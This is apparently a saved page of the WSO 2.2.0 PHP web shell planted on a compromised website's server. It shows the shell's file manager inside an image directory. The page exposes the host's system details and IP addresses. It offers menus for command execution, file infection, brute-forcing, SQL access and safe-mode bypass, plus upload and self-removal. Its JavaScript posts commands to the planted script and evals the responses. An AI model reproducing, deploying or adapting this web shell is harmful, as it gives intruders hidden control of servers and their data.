<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>www.akvatel.ru - WSO 2.2.0</title>
<style>
	body {background-color:#000;color:#e1e1e1;}
	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
	table.info	{color:#C3C3C3;background-color:#000;}
	span,h1,a	{color:#fff !important;}
	span		{font-weight:bolder;}
	h1			{border-left:5px solid teal;padding:2px 5px;font:14pt Verdana;background-color:#222;margin:0px;}
	div.content	{padding:5px;margin-left:5px;background-color:#000;}
	a			{text-decoration:none;}
	a:hover		{text-decoration:underline;}
	.ml1		{border:1px solid #444;padding:5px;margin:0;overflow:auto;}
	.bigarea	{width:100%;height:250px; }
	input, textarea, select	{margin:0;color:#fff;background-color:#444;border:1px solid #000; font:9pt Courier New;}
	form		{margin:0px;}
	#toolsTbl	{text-align:center;}
	.toolsInp	{width:300px}
	.main th	{text-align:left;background-color:#000;}
	.main tr:hover{background-color:#5e5e5e}
	.main td, th{vertical-align:middle}
	.l1			{background-color:#444}
	pre			{font:9pt Courier New;}
</style>
<script>
	function set(a,c,p1,p2,p3,charset) {
		if(a != null)document.mf.a.value=a;
		if(c != null)document.mf.c.value=c;
		if(p1 != null)document.mf.p1.value=p1;
		if(p2 != null)document.mf.p2.value=p2;
		if(p3 != null)document.mf.p3.value=p3;
		if(charset != null)document.mf.charset.value=charset;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		document.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = "ajax=true";
		for(i=0;i<document.mf.elements.length;i++)
			params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
		sr('/img/addr/suruba.php', params);
	}
	function sr(url, params) {	
		if (window.XMLHttpRequest) {
			req = new XMLHttpRequest();
			req.onreadystatechange = processReqChange;
			req.open("POST", url, true);
			req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
			req.send(params);
		} 
		else if (window.ActiveXObject) {
			req = new ActiveXObject("Microsoft.XMLHTTP");
			if (req) {
				req.onreadystatechange = processReqChange;
				req.open("POST", url, true);
				req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
				req.send(params);
			}
		}
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				//alert(req.responseText);
				var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} 
			else alert("Request error!");
	}
</script>
<head><body><div style="position:absolute;width:100%;background-color:#444;top:0;left:0;">
<form method=post name=mf style='display:none;'>
<input type=hidden name=a value='FilesMan'>
<input type=hidden name=c value='/www/docs/wwwakvatel/www/img/addr/'>
<input type=hidden name=p1 value=''>
<input type=hidden name=p2 value=''>
<input type=hidden name=p3 value=''>
<input type=hidden name=charset value='UTF-8'>
</form>
<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>FreeBSD hwf-be01-int.mtu.ru 10.3-RELEASE-p29 FreeBSD 10.3-RELEASE-p29 #0: Tue Apr  3 19:17:10 UTC 2018     root@amd64-bu  <a href="http://www.google.com/search?q=FreeBSD+hwf-be01-int.mtu.ru+10.3-RELEASE-p29+FreeBSD+10.3-RELEASE-p29+%230%3A+Tue+Apr++3+19%3A17%3A10+UTC+2018+++++root%40amd64-builder.daemonology.net%3A%2Fusr%2Fobj%2Fusr%2Fsrc%2Fsys%2FGENERIC+i386" target="_blank">[Google]</a> <a href="https://github.com/HARDLINUX/webshell/search?utf8=✓&q=FreeBSD+10." target=_blank>[Exploit-Git]</a></nobr><br>80 ( www ) <span>Group:</span> 10000 ( ? )<br>4.4.4 <span>Safe mode:</span> <font color=#00A8A8><b>OFF</b></font> <a href=# onclick="g('Php',null,null,'info')">[ phpinfo ]</a> <span>Datetime:</span> 2019-06-29 19:29:46<br>96.85 GB <span>Free:</span> 11.29 GB (11%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/www/")'>www/</a><a href='#' onclick='g("FilesMan","/www/docs/")'>docs/</a><a href='#' onclick='g("FilesMan","/www/docs/wwwakvatel/")'>wwwakvatel/</a><a href='#' onclick='g("FilesMan","/www/docs/wwwakvatel/www/")'>www/</a><a href='#' onclick='g("FilesMan","/www/docs/wwwakvatel/www/img/")'>img/</a><a href='#' onclick='g("FilesMan","/www/docs/wwwakvatel/www/img/addr/")'>addr/</a> <font color=#00A8A8><b>drwxrwxrwx</b></font> <a href=# onclick="g('FilesMan','/www/docs/wwwakvatel/www/img/addr','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset"><option value="UTF-8" selected>UTF-8</option><option value="Windows-1251" >Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></optgroup></select><br><span>Server IP:</span><br>213.87.75.19<br><span>Client IP:</span><br>192.168.0.14</nobr></td></tr></table><table cellpadding=3 cellspacing=0 width=100% style="background-color:teal;"><tr><th width="7%">[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th width="7%">[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th width="7%">[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th width="7%">[ <a href="#" onclick="g('Infect',null,'','','')">Infect</a> ]</th><th width="7%">[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th width="7%">[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th width="7%">[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th width="7%">[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th width="7%">[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th width="7%">[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th width="7%">[ <a href="#" onclick="g('Domains',null,'','','')">Domains</a> ]</th><th width="7%">[ <a href="#" onclick="g('Logout',null,'','','')">Logout</a> ]</th><th width="7%">[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div><h1>File manager</h1><div class=content><script>
	function sa() {
		for(i=0;i<document.files.elements.length;i++)
			if(document.files.elements[i].type == 'checkbox')
				document.files.elements[i].checked = document.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post>
<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/www/docs/wwwakvatel/www/img/addr/..');"><b>[ .. ]</b></a></td><td>dir</td><td>2009-03-02 13:14:04</td><td>3282/10000</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=white><b>drwxr-xr-x</b></font></td><td><a href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="sym" class=chkbx></td><td><a href=# onclick="g('FilesMan','/www/docs/wwwakvatel/www/img/addr/sym');"><b>[ sym ]</b></a></td><td>dir</td><td>2019-06-29 08:15:57</td><td>80/10000</td><td><a href=# onclick="g('FilesTools',null,'sym','chmod')"><font color=#00A8A8><b>drwxr-xr-x</b></font></td><td><a href="#" onclick="g('FilesTools',null,'sym', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'sym', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="suruba.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'suruba.php', 'view')">suruba.php</a></td><td>82.13 KB</td><td>2019-06-29 08:08:10</td><td>80/10000</td><td><a href=# onclick="g('FilesTools',null,'suruba.php','chmod')"><font color=#00A8A8><b>-rw-r--r--</b></font></td><td><a href="#" onclick="g('FilesTools',null,'suruba.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'suruba.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'suruba.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'suruba.php', 'download')">D</a></td></tr>	<tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='/www/docs/wwwakvatel/www/img/addr/'>
	<input type=hidden name=charset value='UTF-8'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option></select>&nbsp;<input type="submit" value=">>"></td></tr>
	</form></table></div>
	</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%">
	<tr>
		<td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="/www/docs/wwwakvatel/www/img/addr/"><input type=submit value=">>"></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
	</tr>
	<tr>
		<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><font color=teal>[ Writeable ]</font></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><font color=teal>[ Writeable ]</font></td>
	</tr>
	<tr>
		<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='/www/docs/wwwakvatel/www/img/addr/'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='UTF-8'>
		<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form><font color=teal>[ Writeable ]</font></td>
	</tr>

</table>
</div>
</body></html>
